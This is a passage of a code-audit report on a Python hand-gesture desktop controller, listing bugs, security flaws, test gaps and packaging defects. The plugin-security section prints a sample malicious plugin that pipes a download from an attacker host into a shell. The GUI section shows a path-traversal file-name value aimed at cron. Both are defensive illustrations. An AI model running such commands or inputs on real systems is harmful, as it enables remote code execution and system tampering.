* `test\\\\\\\_linux\\\\\\\_controller.py:90`: `@patch("os.environ", {"XDG\\\\\\\_SESSION\\\\\\\_TYPE": "wayland"})` — the code never checks `XDG\\\\\\\_SESSION\\\\\\\_TYPE`. The patch is irrelevant and misleading.
* `test\\\\\\\_os\\\\\\\_factory.py:12-15`: injects `sys.modules\\\\\\\["Quartz"]`, `sys.modules\\\\\\\["evdev"]`, etc. at module level. This **pollutes `sys.modules` for the entire test session**, affecting any other test that imports these modules.
* **No `test\\\\\\\_windows\\\\\\\_controller.py` exists at all** — the most likely first-adopter platform has zero unit-test coverage.
* **No test for the P0 key-name vocabulary bug.** No test that `KeyPress:ArrowLeft` (the default profile action) actually produces a keystroke on any platform.
* **No test for the macOS `cmd+m` → `cmd+a` bug.**
* **No test for the Linux xdotool minimize `$(...)` bug.**
* **No real-OS integration tests.** All OS controller tests use `MagicMock` for `evdev`, `Quartz`, `subprocess`. The struct packing bugs, keycode map gaps, and Accessibility permission issue are invisible to CI.
\---
### 4.4 Plugin System
**Files:** `gesture\\\\\\\_controller/plugins/{plugin\\\\\\\_loader,\\\\\\\_\\\\\\\_init\\\\\\\_\\\\\\\_}.py`, `gesture\\\\\\\_controller/plugins/builtin/{media\\\\\\\_gestures,\\\\\\\_\\\\\\\_init\\\\\\\_\\\\\\\_}.py`.
#### 4.4.1 Security
**\[P0] Plugins execute unsandboxed Python before manifest validation.** `plugin\\\\\\\_loader.py:104-127`:
```python
def \\\\\\\_load\\\\\\\_plugin(self, path: Path) -> Plugin:
    module = importlib.util.module\\\\\\\_from\\\\\\\_spec(spec)
    sys.modules\\\\\\\[module\\\\\\\_name] = module
    try:
        spec.loader.exec\\\\\\\_module(module)   # ← ARBITRARY CODE EXECUTES HERE
    except Exception as e:
        raise PluginLoadError(str(path), f"Import error: {e}")
    # 1. Validate PLUGIN\\\\\\\_META
    if not hasattr(module, "PLUGIN\\\\\\\_META"):   # ← validation happens AFTER execution
        raise PluginLoadError(str(path), "Missing PLUGIN\\\\\\\_META")
```
By the time `PLUGIN\\\\\\\_META` is validated (line 120), the plugin's module-level code has **already run** (line 115). A malicious plugin in `\\\\\\\~/.config/gesture\\\\\\\_controller/plugins/evil.py` containing:
```python
import os, urllib.request
os.system("curl http://attacker.com/payload | sh")
```
executes on **every application startup**, before any schema check. The schema only validates `PLUGIN\\\\\\\_META` — there is no AST inspection, no import restriction, no subprocess restriction, no network restriction.
There is **no manifest signature verification**. The schema (lines 63-73) requires only `name` and `version` as strings. There is no `author\\\\\\\_signature`, no `min\\\\\\\_host\\\\\\\_version`, no `permissions` field declaring what OS capabilities the plugin needs.
#### 4.4.2 Bugs \& correctness
**\[P1] `sys.modules\\\\\\\[module\\\\\\\_name] = module` before `exec\\\\\\\_module`** (line 112). If `exec\\\\\\\_module` raises, a partially-initialized module is left in `sys.modules`. The next `import gesture\\\\\\\_controller.plugins.<name>` returns the broken module. This causes cascading import failures.
**\[P1] Plugin name collision across directories** (lines 92-95). `seen\\\\\\\_names` deduplicates by `PLUGIN\\\\\\\_META\\\\\\\["name"]`, but `PLUGIN\\\\\\\_DIRS` order is builtin → bundled → user. The first plugin with a given name wins. **User plugins cannot override builtins.** Undocumented and surprising.
**\[P1] Filename collision in `sys.modules`** (line 106). `module\\\\\\\_name = f"gesture\\\\\\\_controller.plugins.{path.stem}"`. Two plugins in different directories with the same filename (e.g., both `utils.py`) get the same module name; the second overwrites the first in `sys.modules`.
**\[P1] Hot-reload stale references** (lines 157-171). When a plugin file changes, `\\\\\\\_load\\\\\\\_plugin` re-executes the module and updates `self.\\\\\\\_plugins\\\\\\\[name]`. But the engine's gesture registry and the `ActionDispatcher` may hold **direct references** to the old module's `GESTURE\\\\\\\_DEFINITIONS` and `ACTION\\\\\\\_HANDLERS`. The `"plugin\\\\\\\_reloaded"` event is published, but **no subscriber in scope** re-binds those references. Hot-reload is effectively broken for action handlers.
**\[P1] Hot-reload dedup logic is wrong** (lines 164-167). If the plugin's `PLUGIN\\\\\\\_META\\\\\\\["name"]` **changed** during the edit, the old entry is deleted (by path match) but the old name is never published as "unloaded". The engine still thinks the old plugin is active.
**\[P2] `\\\\\\\_default\\\\\\\_schema` is too permissive** (lines 63-73). No `additionalProperties: false`, no `pattern` on `name` (a plugin named `../../etc` would pass schema validation), no `min\\\\\\\_host\\\\\\\_version` field, no `permissions` array.
**\[P2] `ACTION\\\\\\\_HANDLERS` is never type-checked** (line 144). `getattr(module, "ACTION\\\\\\\_HANDLERS", {})` — if a plugin sets `ACTION\\\\\\\_HANDLERS = \\\\\\\["not", "a", "dict"]`, `action\\\\\\\_name in plugin.actions` would iterate characters of each string.
**\[P2] No plugin lifecycle hooks.** There is no `on\\\\\\\_load()`, `on\\\\\\\_unload()`, `on\\\\\\\_config\\\\\\\_changed()` callback convention. Plugins cannot clean up resources when reloaded.
**\[P2] `discover\\\\\\\_all` creates directories** (lines 81-85). `plugin\\\\\\\_dir.mkdir(parents=True, exist\\\\\\\_ok=True)` — creating directories in the user's home dir on first run without consent is surprising.
#### 4.4.3 Performance
* `discover\\\\\\\_all` synchronously imports every `.py` file in 3 directories on startup. Each import executes module-level code. With 10 plugins averaging 50 ms of import work, that's 500 ms added to startup. No lazy loading.
#### 4.4.4 Testing gaps
* No test for the P0 security issue (malicious plugin executing before validation).
* No test for `ACTION\\\\\\\_HANDLERS` type validation.
* No test for plugin name collision across directories.
* `test\\\\\\\_hot\\\\\\\_reload\\\\\\\_functionality` (line 175-221) accesses `loader.\\\\\\\_observer.\\\\\\\_handlers` — a private watchdog attribute. Breaks on watchdog API changes.
\---
### 4.5 GUI Layer
**Files:** `gesture\\\\\\\_controller/gui/{app\\\\\\\_entry,tray\\\\\\\_icon,settings\\\\\\\_window,overlay,gesture\\\\\\\_recorder}.py`.
#### 4.5.1 Bugs \& correctness
**\[P0] Qt threading violation throughout.** `EventBus.publish` calls handlers **synchronously on the publisher's thread**. The engine publishes `"gesture\\\\\\\_triggered"` from the engine thread. `app\\\\\\\_entry.\\\\\\\_on\\\\\\\_gesture\\\\\\\_triggered` (line 92-95) is subscribed to that event and calls `self.\\\\\\\_overlay.show\\\\\\\_action\\\\\\\_feedback(...)` which mutates `self.\\\\\\\_action\\\\\\\_feedback`, calls `QTimer.singleShot(duration, self.\\\\\\\_clear\\\\\\\_feedback)`, and calls `self.update()` — all **Qt GUI operations invoked from a non-GUI thread**. Qt requires all widget interaction to happen on the main thread. This causes intermittent segfaults (especially on Linux/X11), corrupted repaint state, and timers firing on the wrong thread.
Same violation in `TrayController.\\\\\\\_on\\\\\\\_camera\\\\\\\_disconnected/\\\\\\\_recovered` (tray\_icon.py:115-133). These are event-bus callbacks called from the engine thread. They call `self.\\\\\\\_tray\\\\\\\_icon.showMessage(...)` and `self.\\\\\\\_status\\\\\\\_action.setText(...)` directly.
**\[P0] Custom gesture recording is broken from Settings.** `app\\\\\\\_entry.py:46`:
```python
self.\\\\\\\_settings = SettingsWindow(self.\\\\\\\_config)
```
`SettingsWindow.\\\\\\\_\\\\\\\_init\\\\\\\_\\\\\\\_` defaults `landmark\\\\\\\_callback=None`. When the user clicks "Record Custom Gesture", `GestureRecorder(parent=self, landmark\\\\\\\_callback=self.\\\\\\\_landmark\\\\\\\_callback)` gets `None`. `GestureRecorder.\\\\\\\_capture\\\\\\\_frame` checks `if not self.\\\\\\\_landmark\\\\\\\_callback: return` — so **no frames are ever captured**. The recorder shows a blank canvas, "records" empty data, and `\\\\\\\_stop\\\\\\\_recording` checks `if len(self.\\\\\\\_current\\\\\\\_recording) >= 10:` which fails, so the recording is discarded. The user clicks "Save Gesture" and gets "Need 3 recordings, have 0". **Custom gesture recording is completely broken from the shipped GUI.**
**\[P0] `\\\\\\\_on\\\\\\\_custom\\\\\\\_gesture\\\\\\\_recorded` is dead code.** Even if recording worked, the save path checks `if dest\\\\\\\_dir:` where `dest\\\\\\\_dir = self.\\\\\\\_landmark\\\\\\\_callback.\\\\\\\_\\\\\\\_self\\\\\\\_\\\\\\\_.\\\\\\\_custom\\\\\\\_matcher.\\\\\\\_template\\\\\\\_dir if self.\\\\\\\_landmark\\\\\\\_callback else None`. Since `\\\\\\\_landmark\\\\\\\_callback` is None, `dest\\\\\\\_dir` is None, and the entire save block is skipped — no error, no confirmation. The user's recorded gesture vanishes.
**\[P0] Path traversal in custom gesture save.** `settings\\\\\\\_window.py:360`:
```python
dest\\\\\\\_path = dest\\\\\\\_dir / f"{name}.json"
```
`name` comes from `template\\\\\\\_data\\\\\\\["name"]` which comes from `self.\\\\\\\_name\\\\\\\_input.text().strip()`. No sanitization. A user (or malicious plugin calling the signal) entering `../../etc/cron.d/evil` writes to `/etc/cron.d/evil.json` if the user has write access.
**\[P0] `\\\\\\\_poll\\\\\\\_engine` reads engine state without a lock** (app\_entry.py:79-83).
```python
def \\\\\\\_poll\\\\\\\_engine(self) -> None:
    hands = self.\\\\\\\_engine.get\\\\\\\_current\\\\\\\_hands()
    fsm\\\\\\\_states = self.\\\\\\\_engine.get\\\\\\\_fsm\\\\\\\_states() if hands else None
    self.\\\\\\\_overlay.set\\\\\\\_hand\\\\\\\_data(hands, fsm\\\\\\\_states)
```
`engine.get\\\\\\\_current\\\\\\\_hands` returns `self.\\\\\\\_current\\\\\\\_hands` with no synchronization. The engine thread mutates this list on every frame; the GUI thread reads it 60×/second. **Data race** — the list can be reallocated mid-read, or a `Hand` object can be in a half-updated state.
**\[P1] `signal.signal(signal.SIGINT, ...)` (app\_entry.py:132) doesn't work reliably with Qt.** Qt's event loop doesn't return control to Python between events, so SIGINT is only delivered on the next Python callback. Ctrl+C in the terminal is ignored until the app is killed.
**\[P1] `\\\\\\\_shutdown` doesn't stop the plugin hot-reload watcher** (lines 117-125). If `PluginLoader.start\\\\\\\_hot\\\\\\\_reload` was called, the watchdog Observer thread is never joined. The process may hang on exit.
**\[P1] `\\\\\\\_on\\\\\\\_config\\\\\\\_changed` directly mutates overlay internals** (line 101). `self.\\\\\\\_overlay.\\\\\\\_config = new\\\\\\\_config` — bypasses any encapsulation.
**\[P1] No `isSystemTrayAvailable()` check.** On GNOME without a tray extension, `QSystemTrayIcon.show()` silently fails. The app appears to start but has no tray icon and no way to open Settings (since `\\\\\\\_show\\\\\\\_settings` is only triggered from the tray).
**\[P1] `create\\\\\\\_tray\\\\\\\_icon` hardcodes 32×32 pixmap.** On HiDPI displays (200% scaling), the tray icon is tiny. Should use `QIcon` with multiple sizes or `devicePixelRatio`.
**\[P1] `\\\\\\\_on\\\\\\\_apply` writes the ENTIRE config dict to disk** (settings\_window.py:394). `yaml.safe\\\\\\\_dump(self.\\\\\\\_config.\\\\\\\_config, f)` — this overwrites the user's `config.yaml` with the in-memory representation, **destroying all comments, formatting, and unknown keys**.
**\[P1] `HotkeyCaptureWidget` uses `event.text().upper()`** (line 77). This loses distinction between e.g. "1" (digit) and "!" (Shift+1). The captured hotkey "Shift+!" is stored, but on playback `key\\\\\\\_combo(\\\\\\\["Shift", "!"])` fails on all platforms.
**\[P1] Hardcoded dark theme** (settings\_window.py:101-148). The entire stylesheet is dark. On a light-theme system, the settings window is jarring. No `QStyleHints.colorScheme()` detection.
**\[P1] `reposition()` only called in `\\\\\\\_\\\\\\\_init\\\\\\\_\\\\\\\_`** (overlay.py:31). If the user plugs in an external monitor, changes resolution, or changes display scaling, the overlay doesn't re-cover the screen.
**\[P1] `QFont("Segoe UI", 20, QFont.Weight.Bold)`** (overlay.py:132) — "Segoe UI" is Windows-only. On macOS it falls back to Helvetica; on Linux to DejaVu Sans. Font metrics differ, so text may overflow the capsule.
**\[P2] `\\\\\\\_camera\\\\\\\_device.currentIndex()` vs `currentData()`** (settings\_window.py:373). The combobox was populated with `addItem(f"Camera {i}", i)` — data is the camera index. `currentIndex()` returns the position, which happens to equal the data, but breaks if items are reordered or filtered. Should use `currentData()`.
**\[P2] `HotkeyCaptureWidget.keyPressEvent` doesn't handle Esc to cancel.**
**\[P2] `paintEvent` does `self.\\\\\\\_config.get("hud", {}).get("enabled", True)` on every paint.** If `\\\\\\\_config` is replaced mid-paint, the dict lookup could fail.
**\[P2] `WA\\\\\\\_TransparentForMouseEvents` set twice** (overlay.py:15, 21). Once as a window flag, once as a widget attribute. Redundant.
**\[P2] No multi-monitor with mixed-DPI support.** `reposition()` uses `primary.virtualGeometry()` which returns the combined geometry. On Windows with mixed-DPI monitors, a single `QWidget` cannot span monitors with different DPI.
**\[P2] `"hand": "Right"` hardcoded in `gesture\\\\\\\_recorder.py:232`.** The recorder always saves the template as a right-hand gesture. If the user records with their left hand, the template won't match left-hand input.
**\[P2] `\\\\\\\_on\\\\\\\_record\\\\\\\_clicked` creates a new `QTimer` each click** (gesture\_recorder.py:157). If the user clicks "Record" multiple times during the countdown, multiple timers fire.
**\[P3] `app\\\\\\\_entry.py:25` `QApplication.instance()` check missing.** Crashes if another QApplication exists in the same process (breaks testability).
#### 4.5.2 Performance
* `\\\\\\\_poll\\\\\\\_timer.start(16)` (app\_entry.py:63) = 60 FPS. Every tick calls `get\\\\\\\_current\\\\\\\_hands()`, `get\\\\\\\_fsm\\\\\\\_states()`, and `overlay.set\\\\\\\_hand\\\\\\\_data()` which calls `self.update()` — scheduling a full repaint. On a 4K display, repainting the full-screen overlay 60×/second is expensive. Should be tied to actual hand presence.
#### 4.5.3 UX gaps
* No first-run wizard: macOS needs Accessibility permission, Linux needs udev rule + input group, Windows may need UIPI awareness. None of this is communicated.
* No i18n: all UI strings hardcoded in English. No `tr()` calls, no `.ts` translation files.
* No a11y: no `QWidget.setAccessibleName()` calls, no screen-reader support.
* Tray icon color change (green→red) may not be visible to color-blind users (\~8% of men). No text overlay, no badge.
* No "Reset to Defaults" button in settings.
* No "Apply" vs "OK" distinction in settings.
* No search/filter in the gestures tree.
* No live preview of what a custom gesture will match against.
#### 4.5.4 Testing gaps
* `test\\\\\\\_gui\\\\\\\_integration.py` is a **placeholder**: `def test\\\\\\\_placeholder(): pass`. **Zero real GUI integration tests** for the `app\\\\\\\_entry` wiring.
* `conftest.py:9` does `gc.disable()` for the entire test session to work around PyQt6 teardown segfaults. This is a red flag — it means the GUI code has known object-lifecycle bugs that are masked by disabling GC.
* No test for the P0 path-traversal bug.
* No test that `show\\\\\\\_action\\\\\\\_feedback` or `\\\\\\\_on\\\\\\\_camera\\\\\\\_disconnected` is marshalled to the GUI thread.
* No test for `app\\\\\\\_entry.\\\\\\\_shutdown` — no verification that timers stop, engine shuts down, overlay hides, app quits.
* No test for config writeback destroying comments.
\---
### 4.6 Testing \& QA Infrastructure
**Files:** `tests/conftest.py`, `tests/\\\\\\\_\\\\\\\_init\\\\\\\_\\\\\\\_.py`, `tests/replay/\\\\\\\_\\\\\\\_init\\\\\\\_\\\\\\\_.py`, `tests/integration/test\\\\\\\_install\\\\\\\_verification.py`, `tests/benchmarks/\\\\\\\_\\\\\\\_init\\\\\\\_\\\\\\\_.py`, `tests/e2e/test\\\\\\\_minimize\\\\\\\_gesture.py`, `pyproject.toml` `\\\\\\\[tool.pytest.ini\\\\\\\_options]`.
#### 4.6.1 Test-file census
|Bucket|Count|Notes|
|-|-|-|
|`tests/unit/`|23|Decent coverage; but two promised tests missing|
|`tests/integration/`|7|`test\\\\\\\_gui\\\\\\\_integration.py` is a placeholder|
|`tests/e2e/`|1|Mocks everything; not really e2e|
|`tests/replay/`|**0**|Only `\\\\\\\_\\\\\\\_init\\\\\\\_\\\\\\\_.py` — empty|
|`tests/benchmarks/`|**0**|Only `\\\\\\\_\\\\\\\_init\\\\\\\_\\\\\\\_.py` — empty|
|**Total**|**31**||
#### 4.6.2 Coverage gaps
|Module|Has unit test?|Notes|
|-|-|-|
|`core/engine.py`|✓|But mocks every boundary|
|`core/event\\\\\\\_bus.py`|✓||
|`core/config\\\\\\\_manager.py`|✓||
|`core/state\\\\\\\_machine.py`|✓|Doesn't cover chained comparisons, conflict resolution|
|`vision/camera\\\\\\\_stream.py`|✓||
|`vision/landmark\\\\\\\_extractor.py`|✓|Mocks MediaPipe entirely|
|`vision/one\\\\\\\_euro\\\\\\\_filter.py`|✓|Tests are tautologies|
|`models/data\\\\\\\_types.py`|✓||
|`models/feature\\\\\\\_engineering.py`|✓|All fixtures have z=0|
|`models/dtw\\\\\\\_matcher.py`|✓|Bypasses `update\\\\\\\_buffer`|
|`os\\\\\\\_integration/\\\\\\\_\\\\\\\_init\\\\\\\_\\\\\\\_.py`|✓||
|`os\\\\\\\_integration/base\\\\\\\_controller.py`|❌|ABC — no contract test|
|`os\\\\\\\_integration/windows\\\\\\\_controller.py`|❌|**No test exists**|
|`os\\\\\\\_integration/macos\\\\\\\_controller.py`|✓|But `test\\\\\\\_macos\\\\\\\_controller.py:93` has a non-assertion|
|`os\\\\\\\_integration/linux\\\\\\\_wayland\\\\\\\_controller.py`|✓|But `test\\\\\\\_linux\\\\\\\_controller.py:232-240` has no assertions|
|`os\\\\\\\_integration/action\\\\\\\_dispatcher.py`|✓||
|`actions/action\\\\\\\_mapper.py`|❌|**Plan promised it; file doesn't exist**|
|`plugins/plugin\\\\\\\_loader.py`|✓||
|`plugins/builtin/media\\\\\\\_gestures.py`|❌|Only via `test\\\\\\\_plugin\\\\\\\_schema.py`|
|`gui/overlay.py`|✓||
|`gui/tray\\\\\\\_icon.py`|✓||
|`gui/gesture\\\\\\\_recorder.py`|✓||
|`gui/settings\\\\\\\_window.py`|✓||
|`gui/app\\\\\\\_entry.py`|❌|`test\\\\\\\_gui\\\\\\\_integration.py` is a placeholder|
|`main.py` (top-level)|❌||
**Two modules with promised-but-missing tests: `actions/action\\\\\\\_mapper.py` and `os\\\\\\\_integration/windows\\\\\\\_controller.py`.** A Windows user is the most likely first adopter; the Windows controller has zero coverage.
#### 4.6.3 Test infrastructure bugs
**\[P1] `tests/replay/` and `tests/benchmarks/` are empty despite being central to the plan.** `test\\\\\\\_strategy.md:64-74` lists 15 specific replay fixture files that should exist in `tests/replay/fixtures/`. `test\\\\\\\_strategy.md:233-247` lists 8 specific benchmark tests. **None exist.** `requirements-dev.txt` lists `pytest-benchmark>=4.0.0` and `hypothesis>=6.82.0`. **No `@given` decorator exists anywhere in the test suite.** **No `benchmark` fixture is used anywhere.** The dev dependencies are paid for but never exercised.
**\[P2] `conftest.py` globally disables GC and never re-enables.**
```python
def pytest\\\\\\\_configure(config):
    import gc
    gc.disable()
def pytest\\\\\\\_unconfigure(config):
    pass  # Do not enable GC to avoid deconstruction access violations on process exit.
```
Acknowledged PyQt6 segfault workaround — the comment admits PyQt6 teardown crashes on GC. This is a real bug masquerading as a fixture. Long-running test suites will accumulate memory.
**\[P2] pytest markers defined but never applied.** `pyproject.toml:71-78` defines `benchmark`, `slow`, `e2e` markers. There's no `@pytest.mark.e2e` decorator on `test\\\\\\\_minimize\\\\\\\_gesture.py`. CI cannot do `-m "not e2e"` to skip hardware tests because nothing is marked.
**\[P2] `addopts` does not include `--strict-markers`, `--strict-config`, `-ra`, or `--cov=gesture\\\\\\\_controller`.** The `fail\\\\\\\_under=80` in `\\\\\\\[tool.coverage.report]` only fires if `--cov` is passed.
**\[P3] `test\\\\\\\_install\\\\\\\_verification.py` mutates `sys.path`.** `scripts/` is not a Python package (no `\\\\\\\_\\\\\\\_init\\\\\\\_\\\\\\\_.py`). This works by accident; breaks the moment the package is `pip install`ed.
**\[P3] `test\\\\\\\_minimize\\\\\\\_gesture.py` pokes private attributes.** `engine.\\\\\\\_controller = mock\\\\\\\_controller; engine.\\\\\\\_dispatcher.\\\\\\\_controller = mock\\\\\\\_controller`. Any rename breaks the test silently.
**\[P3] The "E2E" test is not E2E.** `tests/e2e/test\\\\\\\_minimize\\\\\\\_gesture.py` mocks: `start\\\\\\\_camera\\\\\\\_process`, `SharedMemory`, `engine.\\\\\\\_extractor.extract`, `compute\\\\\\\_features`, and the OS controller. **The only "real" code exercised is the FSM state machine and the action dispatcher.** This is fine as an integration test but mislabelled.
#### 4.6.4 Testing quality bugs
* `test\\\\\\\_macos\\\\\\\_controller.py:93`: `mock\\\\\\\_quartz.CGEventPost.call\\\\\\\_count == 2` — **comparison expression, not an assertion**. The test passes regardless of `call\\\\\\\_count`.
* `test\\\\\\\_linux\\\\\\\_controller.py:232-240`: `test\\\\\\\_linux\\\\\\\_window\\\\\\\_manager\\\\\\\_actions` has comments `# verify alt+tab triggered` and `# verify super+d triggered` but **no assertions at all**. The test passes trivially.
* `test\\\\\\\_linux\\\\\\\_controller.py:90`: `@patch("os.environ", {"XDG\\\\\\\_SESSION\\\\\\\_TYPE": "wayland"})` — the code never checks `XDG\\\\\\\_SESSION\\\\\\\_TYPE`. The patch is irrelevant.
* `test\\\\\\\_os\\\\\\\_factory.py:12-15`: injects `sys.modules\\\\\\\["Quartz"]`, `sys.modules\\\\\\\["evdev"]` at module level. **Pollutes `sys.modules` for the entire test session**.
* `test\\\\\\\_one\\\\\\\_euro\\\\\\\_filter.py::test\\\\\\\_static\\\\\\\_input\\\\\\\_no\\\\\\\_drift` is a tautology.
* `test\\\\\\\_dtw\\\\\\\_matcher.py::test\\\\\\\_custom\\\\\\\_gesture\\\\\\\_matcher\\\\\\\_matching` bypasses `update\\\\\\\_buffer` entirely.
\---
### 4.7 Packaging \& Distribution
**Files:** `setup.py`, `pyproject.toml`, `requirements.txt`, `requirements-dev.txt`, `gesture\\\\\\\_controller.spec`, `packaging/99-gesture-controller-uinput.rules`, `scripts/verify\\\\\\\_install.py`.
#### 4.7.1 Bugs
**\[P0] License field mismatch — `pyproject.toml` says MIT, `LICENSE` is AGPL-3.0.** `pyproject.toml:11` `license = {text = "MIT"}`. `LICENSE` line 1: `GNU AFFERO GENERAL PUBLIC LICENSE`. `README.md:137`: "This project is licensed under the **GNU Affero General Public License v3.0 (AGPL-3.0)**." The wheel's `License-File:` and `Classifier: License ::` metadata will tell PyPI and any SBOM tool this is MIT-licensed. AGPL-3.0 has *network-copyleft* obligations MIT does not. Anyone consuming this as a transitive dep in a commercial product will read "MIT" from the wheel metadata, ship it, and discover later they're in AGPL violation. **This is the single most damaging defect in the repo.**
**\[P0] Platform-specific runtime deps not declared.** `pyproject.toml` lines 12–24 list 11 dependencies, all universal. But the source actually requires:
|Platform|Required package|Declared?|Imported where?|
|-|-|-|-|
|Linux|`evdev>=1.6`|❌|`os\\\\\\\_integration/linux\\\\\\\_wayland\\\\\\\_controller.py:10,16` (lazy try/except)|
|macOS|`pyobjc-framework-Quartz>=9.0`|❌|`os\\\\\\\_integration/macos\\\\\\\_controller.py:14`|
|macOS|`pyobjc-framework-ApplicationServices>=9.0`|❌|`os\\\\\\\_integration/macos\\\\\\\_controller.py:16`|
|macOS|`pyobjc-framework-Cocoa`|❌|`os\\\\\\\_integration/macos\\\\\\\_controller.py:15`|
|Windows|`pywin32>=306`|❌|(would be needed for proper SendInput)|
Lazy-import-and-None pattern means `pip install gesture-controller` *succeeds* on every OS but the app crashes on first run with a confusing `ImportError`. There is no `pip install gesture-controller\\\\\\\[linux]` extra, no `sys\\\\\\\_platform` marker anywhere.
**\[P0] No installer artefacts.** `packaging/` directory contains **exactly one file**: `99-gesture-controller-uinput.rules`. No `.exe`, no `.dmg`, no `.deb`, no `.msi`. The plan promises NSIS for Windows, `hdiutil` for macOS, `fpm` for Linux. **None of these scripts exist.** Non-technical users cannot install this.
**\[P0] No `.github/workflows/` — CI does not exist.** Glob `\\\\\\\*\\\\\\\*/.github/\\\\\\\*\\\\\\\*` returns zero results. No workflows, no issue templates, no PR template, no CODEOWNERS. `test\\\\\\\_strategy.md:253-325` and `master\\\\\\\_development\\\\\\\_plan.md:862-908` both contain complete, ready-to-paste GitHub Actions YAML. **Nobody pasted it.**
**\[P1] No code signing / notarization.** `gesture\\\\\\\_controller.spec:51`: `codesign\\\\\\\_identity=None`. Without Authenticode signing on Windows, SmartScreen will show "Windows protected your PC" warning for every download. Without Apple Developer ID signing + notarization on macOS, Gatekeeper hard-blocks the app entirely (since macOS 10.15).
**\[P1] PyInstaller spec is incomplete.**
* Line 13 bundles the data directory but the README tells users to download `hand\\\\\\\_landmarker.task` manually — there's no `scripts/download\\\\\\\_models.py` invoked by install.
* Line 24 `hiddenimports` missing `mediapipe.tasks.vision`, `mediapipe.tasks.components`. PyInstaller will likely miss transitive imports.
* Line 28 `excludes=\\\\\\\["matplotlib", "tkinter", "scipy", "pandas"]` excludes `scipy` but `mediapipe` transitively requires scipy on some platforms. This will crash the bundle.
* Line 35 `pyz = PYZ(a.pure, a.zipped\\\\\\\_data, cipher=block\\\\\\\_cipher)` — `block\\\\\\\_cipher` was removed in PyInstaller 6.0. Will raise `TypeError` on modern PyInstaller.
* Line 46 `upx=True` — should be `upx=(shutil.which("upx") is not None)`.
* **No Info.plist reference** for macOS `.app` bundle: no `NSCameraUsageDescription`, no `NSAccessibilityUsageDescription`. Without these, macOS will hard-block camera access and Accessibility API use.
* **No BUNDLE step** for macOS: `EXE` + `COLLECT` produces a directory, not an `.app`.
**\[P1] No systemd service file.** `master\\\\\\\_development\\\\\\\_plan.md:1002` promises a "systemd user service file for auto-start (optional)". No such file exists. Non-technical users cannot set auto-start.
**\[P1] No first-run permission wizard.** macOS needs `AXIsProcessTrusted()` prompt + Camera permission + Input Monitoring. Linux needs udev rule + input group. Windows may need UIPI awareness. None of this is implemented.
**\[P1] `verify\\\\\\\_install.py` PyInstaller path is wrong.** `scripts/verify\\\\\\\_install.py:60` uses `Path(\\\\\\\_\\\\\\\_file\\\\\\\_\\\\\\\_).parent.parent / "gesture\\\\\\\_controller" / "data" / "default\\\\\\\_config.yaml"`, but the spec bundles to `gesture\\\\\\\_controller/data` (line 13). The PyInstaller `\\\\\\\_MEIPASS` branch (line 58) looks for `data/default\\\\\\\_config.yaml` (without the `gesture\\\\\\\_controller/` prefix). `verify\\\\\\\_install.check\\\\\\\_config()` will silently fail in any packaged build. Also: `check\\\\\\\_camera()` only opens `cv2.VideoCapture(0)` — fails on systems where the camera is at index 1+. `check\\\\\\\_mediapipe()` never actually instantiates the model.
**\[P2] No version pinning, only lower bounds.** Every dep uses `>=`. `mediapipe>=0.10.0` has shipped multiple breaking releases. `numba>=0.57.0` is locked to a narrow llvmlite range which is locked to a narrow Python range. `PyQt6>=6.5.0` shipped a breaking `Qt.TextFormat` change in 6.6. No upper bounds, no `==` pins, no hashes anywhere.
**\[P2] `requirements.txt` ↔ `pyproject.toml` and `requirements-dev.txt` ↔ `\\\\\\\[project.optional-dependencies].dev` duplicate the same lists.** Byte-identical. There is no single source of truth — these will drift.
**\[P2] No PyPI classifiers, no project URLs, no keywords.** The package is unsearchable on PyPI.
**\[P2] No wheel platform tags for OS-specific deps.** The wheel will be tagged `py3-none-any`. Combined with no platform markers, a Windows user `pip install`ing from PyPI gets a wheel that *claims* to support Windows but lacks `pyobjc` (good) and *also* lacks `evdev` (bad on Linux).
**\[P2] No license file in wheel.** `pyproject.toml` has no `\\\\\\\[project.license-files]` (PEP 639) and no `license = {file = "LICENSE"}`. Even after fixing the license mismatch, the AGPL text won't be inside the wheel. Any downstream consumer who installs from PyPI has no access to the license terms, which is itself an AGPL violation (AGPL §4).
**\[P3] `setup.py` is a 4-line stub duplicating `pyproject.toml`.** With `requires-python = ">=3.11"` and `setuptools>=68`, this file is dead weight. Delete it.
**\[P3] `verify\\\\\\\_install.py` is unreachable** after `pip install` (not installed, not a console script).
#### 4.7.2 Dangerous defaults
* **\[P1] `safety.safety\\\\\\\_gesture\\\\\\\_enabled: false`** — disabled by default. A user who never opens settings has no gesture-based kill switch, only the keyboard hotkey. If they're using a headless kiosk or their keyboard is broken, they cannot stop runaway input injection. **Dangerous.** Default should be `true`.
* **\[P1] `os\\\\\\\_integration.windows.use\\\\\\\_sendinput: false`** — defaults to `pyautogui`, which has documented 50–100ms latency per key event. With this default, the `<30ms` end-to-end latency target is unreachable on Windows.
* **\[P2] `filtering.one\\\\\\\_euro.min\\\\\\\_cutoff: 0.004`** — 250× too small (see §4.2.1). Either justify with an ADR or benchmark, or change to a more standard `1.0` default.
\---
### 4.8 Configuration \& Schemas
**Files:** `gesture\\\\\\\_controller/data/{default\\\\\\\_config.yaml,config\\\\\\\_schema.json,predefined\\\\\\\_gestures.yaml,gesture\\\\\\\_schema.json}`.
#### 4.8.1 Bugs
**\[P1] `config\\\\\\\_schema.json` has no top-level `required`, no `additionalProperties: false`.** A user can delete the `safety` block entirely and the schema validates. A typo like `saftety:` is silently accepted as a new top-level key. No `enum` on `logging.level` (accepts "BANANA"). No `enum` on `filtering.type` (accepts "kalman" even though Kalman isn't implemented). No `minimum`/`maximum` on `hud.opacity` (accepts `-5.0` or `42.0`). No `minimum` on `engine.max\\\\\\\_hands` (accepts `-1`).
**\[P1] `predefined\\\\\\\_gestures.yaml` is not validated by `gesture\\\\\\\_schema.json`.** `gesture\\\\\\\_schema.json` defines the schema for **one gesture**. But `predefined\\\\\\\_gestures.yaml` has top-level `version`, `config`, `gestures`, `app\\\\\\\_profiles`. The schema covers `gestures\\\\\\\[\\\\\\\*]` but **not** `version`, **not** `config`, **not** `app\\\\\\\_profiles`. The `priority\\\\\\\_resolution: confidence` value is not validated against `\\\\\\\["confidence", "priority", "recent"]`. The `app\\\\\\\_profiles` keys (Windows process names like `chrome.exe`) and their action values (`"KeyPress:Ctrl+Shift+Tab"`) are completely unvalidated — a user can typo `"KeyPress:Cntrl+Tab"` and it'll load silently, then crash at dispatch time.
**\[P1] No config migration strategy.** `default\\\\\\\_config.yaml:1` `version: "1.0"`. There is no `migrate()` function in `config\\\\\\\_manager.py`. When `version: "2.0"` ships, every existing user config silently fails schema validation or — worse — loads with default values silently replacing their customizations.
